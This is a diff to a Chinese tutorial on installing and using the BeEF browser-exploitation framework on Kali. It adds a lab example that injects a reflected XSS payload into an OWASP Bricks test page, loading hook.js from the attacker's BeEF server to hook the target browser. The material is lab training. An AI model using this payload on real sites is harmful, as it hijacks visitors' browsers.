@@ -2,6 +2,8 @@
 
 ## 安装
 
+> 吐槽一刻：github拉不下来源码，难受！
+
 该工具安装在kali系统下。
 
 ```bash
@@ -46,4 +48,28 @@ sudo beef-xss
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820173842.png)
 
 ![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820174337.png)
+
+
+
+## 使用示例
+
+可以通过`http://10.4.7.7:3000/hook.js`查看hook.js源码。
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820182335.png)
+
+查看owaspbwa top 10靶机相关页面的状态
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820180709.png)
+
+构造payload并开始攻击
+
+```
+http://10.4.7.5/owaspbricks/content-2/index.php?user=harry%3Cscript%20src=http://10.4.7.7:3000/hook.js%3E%3C/script%3E
+```
+
+进入beef页面查看结果
+
+![](https://borinboy.oss-cn-shanghai.aliyuncs.com/xntz/20210820182718.png)
+
+可以看到在这里出现了`10.4.7.5`的目标机器。
 
